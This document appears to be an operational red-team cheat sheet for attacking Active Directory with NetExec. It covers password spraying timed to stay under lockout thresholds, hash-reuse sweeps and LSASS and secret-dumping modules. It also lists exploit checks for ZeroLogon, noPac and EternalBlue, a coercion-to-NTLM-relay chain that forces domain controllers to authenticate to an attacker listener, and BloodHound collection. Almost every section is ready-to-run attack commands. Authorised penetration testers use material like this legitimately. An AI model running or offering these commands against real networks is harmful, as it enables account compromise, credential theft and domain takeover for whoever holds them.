# Spraying strategy, lockout math, module catalog, BloodHound-CE

## 1. Spray strategy

Spraying = one (or few) likely passwords across many accounts, inverted from
brute force so no single account accumulates failures. nxc is the spray engine
for every protocol it speaks; SMB against a DC is the default because it gives
authoritative domain auth results plus informative NTSTATUS codes.

### Order of operations

1. **Get usernames.** Null session `--users` / `--rid-brute`, LDAP `--users`,
   OSINT (`first.last` from the website), kerbrute-style validation via
   `nxc smb <dc> -u users.txt -p '' -k` (Kerberos pre-auth errors distinguish
   valid vs invalid users without a logon failure).
2. **Get the policy.** `nxc smb <dc> -u '' -p '' --pass-pol` (or with any
   valid cred). Record: *lockout threshold* T, *lockout observation window* W
   (minutes), *lockout duration*, *min password length*, *complexity*.
3. **Pick candidates.** Season+year (`Autumn2024!`, `Winter2025!`), company
   name + year/`!` (`Example2024!`), `Welcome1!`, `Password1!`, local sports
   teams, onboarding defaults found in IT shares/wikis. Respect min length +
   complexity from the policy — don't waste a round on a password the policy
   forbids.
4. **Spray one password per round:**
   ```
   nxc smb 192.0.2.5 -u users.txt -p 'Autumn2024!' -d example.com --continue-on-success --log spray-r1.log
   ```
5. **Wait out the window** between rounds, then next candidate.
6. **Re-spray hits across protocols and hosts** — a domain cred that is only
   `[+]` on the DC may be `(Pwn3d!)` on member servers:
   ```
   nxc smb   192.0.2.0/24 -u jdoe -p 'Autumn2024!' -d example.com --continue-on-success
   nxc winrm 192.0.2.0/24 -u jdoe -p 'Autumn2024!' -d example.com
   nxc mssql 192.0.2.0/24 -u jdoe -p 'Autumn2024!' -d example.com
   nxc rdp   192.0.2.0/24 -u jdoe -p 'Autumn2024!' -d example.com
   ```

### Lockout math

- Threshold **T = 0** → no lockout → unconstrained brute force is on the table
  (`-u users.txt -p biglist.txt`, drop `--no-bruteforce` for full cross-product).
- Threshold **T > 0**, window **W** minutes → budget = **T − safety** attempts
  per account per window. Safety ≥ 1 (users mistype their own passwords; their
  badPwdCount is not zero when you start). Standard: T=5, W=30 → 3 passwords
  per 30 min, i.e. ~1 password per round, 2–3 rounds per hour max.
- badPwdCount resets W minutes after the *last* failure and on any successful
  logon. Each DC keeps its own count but lockout is PDC-aggregated — spray at
  one DC, don't round-robin DCs thinking it divides the count.
- `--users` / LDAP `badPwdCount` attribute shows current counters — pull it
  before a round to skip accounts already at T−1:
  `nxc ldap 192.0.2.5 -u jdoe -p p --query '(badPwdCount>=3)' 'sAMAccountName badPwdCount'`
- Watch the stream live: a single `STATUS_ACCOUNT_LOCKED_OUT` means your math
  or your assumptions are wrong — stop the round.
- Useful signal codes: `STATUS_PASSWORD_MUST_CHANGE` and
  `STATUS_PASSWORD_EXPIRED` = the password **is correct**. Change it with
  `-M change-password -o NEWPASS='...'` or `smbpasswd -r <dc> -U user` and use
  the account.

### Paired / stuffing mode

`--no-bruteforce` zips the lists: `users.txt[i]` with `pass.txt[i]`. Use for
breach-dump credential stuffing and for re-testing `user:user` (username as
password — spray `--no-bruteforce -u users.txt -p users.txt`).

### Local-auth reuse sweeps

Dumped a local Administrator NT hash with `--sam`? Image-based deployments
reuse it everywhere:
```
nxc smb 192.0.2.0/24 -u Administrator -H aad3b...:2b576acbe6bcfda7294d6bd18041b8fe --local-auth --continue-on-success --log reuse.log
```
Every `(Pwn3d!)` → `--sam --lsa` → more hashes → repeat until the graph closes.
Same play with any local account from SAM dumps and with machine account
hashes from `--lsa` (machine accounts auth over SMB/LDAP as `DOMAIN\HOST$`).

## 2. Module catalog (methodology level)

List: `nxc <proto> -L`. Options: `nxc <proto> -M <mod> --options`. Set with
`-o KEY=VALUE [KEY2=VALUE2]`. Module output lands under `~/.nxc/modules/`.

### Loot and credentials (smb)
- **spider_plus** — inventory every readable file across shares into JSON;
  `-o DOWNLOAD_FLAG=true` downloads; `MAX_FILE_SIZE`, `EXCLUDE_DIR` tune it.
  First module to run with any new readable-share cred.
- **lsassy** — remote LSASS dump + parse (via lsassy lib); plaintext/NT of
  logged-on users. Needs admin. Run **enum_av first**.
- **nanodump** / **handlekatz** / **procdump** — alternative LSASS dumpers
  with different EDR profiles (nanodump = minidump via syscall stub).
- **enum_av** — fingerprint AV/EDR from installed services *before* choosing
  an LSASS strategy or dropping tooling.
- **gpp_password** / **gpp_autologin** — cpassword in SYSVOL GPP XML (MS14-025
  AES key is public) and autologon creds in GPO files. Any domain user can read
  SYSVOL — run immediately on first valid domain cred.
- **dpapi_hash**, **keepass_discover** / **keepass_trigger**, **veeam_dump**,
  **winscp**, **mremoteng**, **putty**, **rdcman**, **vnc**, **wifi**,
  **teams_localdb**, **notepad++**/**notepad** — targeted secret extraction
  from common software. Run against Pwn3d admin/jump hosts.
- **laps** (ldap/smb) — read LAPS local-admin passwords your cred can see.

### Vulnerability checks / exploitation (smb)
- **zerologon** — CVE-2020-1472 check against DCs.
- **nopac** — CVE-2021-42278/42287 (sAMAccountName spoof → DA).
- **ms17-010** — EternalBlue check.
- **smbghost** — CVE-2020-0796 check.
- **printnightmare** — CVE-2021-1675/34527 check.
- **coerce_plus** — all-in-one auth coercion (PetitPotam/PrinterBug/DFSCoerce/
  ShadowCoerce/MSEven): `-o LISTENER=192.0.2.99` to force the target to
  authenticate to your relay/responder. **petitpotam**, **spooler**, **dfscoerce**
  exist as single-technique checks.
- **webdav** — WebClient service running = HTTP-auth coercion target
  (relayable to LDAP even when SMB signing is on).
- **shadowrdp**, **rdcman** — RDP-centric abuse.

### AD / LDAP side
- **adcs** — enumerate ADCS CAs and templates (hand off to Certipy for ESC1-16).
- **ldap-checker** — LDAP signing + channel binding enforcement (relay-to-LDAP
  feasibility for RBCD/shadow-cred attacks).
- **maq** — MachineAccountQuota (>0 → add a machine account for RBCD).
- **get-desc-users** / **user-desc** — passwords stashed in description fields.
- **pre2k** — pre-Windows-2000 computer accounts (password = lowercase hostname).
- **daclread** — DACL abuse discovery on AD objects.
- **whoami** — token/priv summary for the authed context.

### MSSQL
- **mssql_priv** — map and execute privilege-escalation paths
  (`-o ACTION=privesc` to climb, `ACTION=rollback` to undo).
- **enum_links** / **exec_on_link** — linked-server discovery and command exec
  across the link chain.

### Coercion → relay chain

The relay play nxc enables end-to-end:
1. `nxc smb 192.0.2.0/24 --gen-relay-list relay.txt` — hosts not requiring signing.
2. `impacket-ntlmrelayx -tf relay.txt -smb2support -socks` (or `-t ldaps://dc` if
   `ldap-checker` says LDAP signing is off).
3. `nxc smb 192.0.2.5 -M coerce_plus -o LISTENER=192.0.2.99` — force the DC/
   fileservers to authenticate to your relay.
4. Relayed admin sessions → `--sam`/`--lsa` via the socks proxy
   (`proxychains nxc smb <t> -u Administrator -p '' --sam`).

## 3. BloodHound-CE collection with nxc

nxc ldap embeds a BloodHound-CE-compatible collector (bloodhound.py lineage):

```
nxc ldap dc01.example.com -u jdoe -p 'Autumn2024!' -d example.com \
    --bloodhound --collection All --dns-server 192.0.2.5 --dns-tcp
```

- `--collection` values: `Default`, `All`, `DCOnly`, `Group`, `LocalAdmin`,
  `Session`, `Trusts`, `ACL`, `Container`, `RDP`, `ObjectProps`, `LoggedOn`.
  `All` = loudest, most complete (touches every computer for sessions/local
  admins). `DCOnly` = LDAP-to-DC only, quiet, no session data.
- `--dns-server` must resolve AD names — point it at a DC. `--dns-tcp` when
  UDP 53 is filtered.
- Kerberos works: add `-k` with FQDN target, or `--use-kcache`.
- Output: timestamped `*_bloodhound.zip` in `~/.nxc/logs/` → upload to
  BloodHound CE (`bloodhound-ce` ingest API or UI).
- Follow-up queries to drive the next nxc pass: shortest path to Domain Admins,
  kerberoastable high-value accounts (cross-check `--kerberoasting` output),
  owned-principal outbound control, unconstrained-delegation hosts
  (cross-check `--trusted-for-delegation`, then coerce the DC to them).

## 4. Spray/round hygiene checklist

- [ ] users.txt deduped, lowercased sAMAccountNames (parse_nxc.py does this)
- [ ] pass-pol captured; budget computed (T−1 minus safety, per window W)
- [ ] one password per round; `--continue-on-success` always
- [ ] `--log spray-rN.log` per round; parse after every round
- [ ] disabled/locked statuses pruned from users.txt between rounds
- [ ] every `[+]` immediately re-swept across subnet + protocols for `(Pwn3d!)`
- [ ] every `(Pwn3d!)` queued for `--sam --lsa` (and `--ntds` if DC)
